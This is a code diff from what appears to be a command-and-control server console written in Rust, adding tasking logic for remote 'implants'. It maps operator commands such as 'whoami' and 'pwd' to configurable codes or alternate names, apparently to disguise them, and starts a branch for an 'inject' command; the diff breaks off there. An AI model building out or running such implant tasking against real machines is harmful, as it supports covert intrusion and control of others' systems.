@@ -771,7 +771,34 @@ fn process_input_implants_interact(implant_id: u16, tag: String) -> &'static str
         else if keyword == "whoami" || keyword == "pwd"
         {
 
-            let mut new_task_command = keyword;
+            let mut new_task_command: &str = keyword;
+            
+            for implant_task_command in &CONFIG.implant.tasks.commands
+            {
+                if implant_task_command.name != keyword
+                {
+                    continue
+                }
+                
+                if CONFIG.implant.tasks.use_commands_codes
+                {
+                    new_task_command = &implant_task_command.code;
+                } 
+                else if CONFIG.implant.tasks.use_alt_names
+                {
+                    new_task_command = &implant_task_command.alt_name;
+                }
+
+                if database::create_implant_task(implant_id, new_task_command)
+                {
+                    println!("[+] Task issued successfully");
+                    break;
+                }
+            }
+        }
+        else if keyword == "inject"
+        {
+            let mut new_task_command: &str = keyword;
             
             for implant_task_command in &CONFIG.implant.tasks.commands
             {
